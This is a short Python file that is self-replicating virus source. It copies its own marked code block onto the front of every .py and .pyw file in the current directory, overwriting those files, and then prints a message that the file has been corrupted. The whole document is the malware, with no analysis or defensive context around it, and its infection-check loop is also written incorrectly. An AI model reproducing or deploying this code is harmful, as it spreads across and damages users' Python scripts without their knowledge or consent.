###START###

import sys,glob

code = []

with open(sys.argv[0],'r') as f:

    lines = f.readlines()

virus_area = False

for line in lines:

    if line == "###START###\n":

        virus_area = True

    if virus_area:

        code.append(line)

    if line == "###END###\n":

        break

python_scripts = glob.glob("*.py") + glob.glob("*.pyw")


for script in python_scripts:
    with open(script,'r') as f:
        script_code = f.readlines()

    infected = False

    for line in script_code:

        if line == "###START###\n":
            infected = True
            break

        if not infected:
            final_code = []
            final_code.extend(code)
            final_code.extend("\n")
            final_code.extend(script_code)

        with open(script,'w') as f:

            f.writelines(final_code)

print("Hello Your File Has Been Corrupted")


###END###